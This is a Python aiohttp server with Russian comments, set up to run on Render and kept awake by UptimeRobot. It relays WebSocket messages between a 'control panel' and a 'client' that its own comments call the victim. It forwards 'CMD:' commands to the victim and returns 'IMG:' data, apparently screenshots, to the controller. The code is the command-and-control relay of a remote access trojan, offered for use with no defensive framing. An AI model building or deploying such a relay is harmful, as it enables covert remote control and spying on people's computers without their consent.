import os
import asyncio
from aiohttp import web

client_ws = None
control_ws = None

# --- HTTP-заглушка для UptimeRobot и Render ---
# Отвечает на GET и автоматически на HEAD запросы
async def health_check(request):
    return web.Response(text="OK", status=200)

# --- Обработчик WebSocket ---
async def websocket_handler(request):
    global client_ws, control_ws
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    print("Новое подключение")

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                message = msg.data
                if message == "CONTROL":
                    control_ws = ws
                    print("Пульт управления подключен")
                    if client_ws:
                        try:
                            await control_ws.send_str("CLIENT_CONNECTED")
                        except Exception:
                            pass
                elif message == "CLIENT":
                    client_ws = ws
                    print("Клиент (жертва) подключен")
                    if control_ws:
                        try:
                            await control_ws.send_str("CLIENT_CONNECTED")
                        except Exception:
                            pass
                elif message.startswith("IMG:"):
                    if control_ws:
                        try:
                            await control_ws.send_str(message)
                        except Exception:
                            control_ws = None
                elif message.startswith("CMD:"):
                    if client_ws:
                        try:
                            await client_ws.send_str(message)
                        except Exception:
                            client_ws = None
            elif msg.type == web.WSMsgType.ERROR:
                print(f'Ошибка WebSocket: {ws.exception()}')
    except Exception as e:
        print(f"Ошибка соединения: {e}")
    finally:
        print("Соединение закрыто")
        if ws == client_ws:
            client_ws = None
        if ws == control_ws:
            control_ws = None
            
    return ws

# --- Запуск сервера ---
if __name__ == "__main__":
    app = web.Application()
    
    # Обработчик WebSocket (клиенты подключаются по адресу /ws)
    app.router.add_get('/ws', websocket_handler)
    
    # Обработчик проверки здоровья для UptimeRobot (без дублирования HEAD)
    app.router.add_get('/', health_check)

    # Получаем порт от Render (по умолчанию 10000)
    port = int(os.environ.get("PORT", 10000))
    print(f"Сервер запущен на порту {port}")
    
    # Запускаем сервер
    web.run_app(app, host='0.0.0.0', port=port)
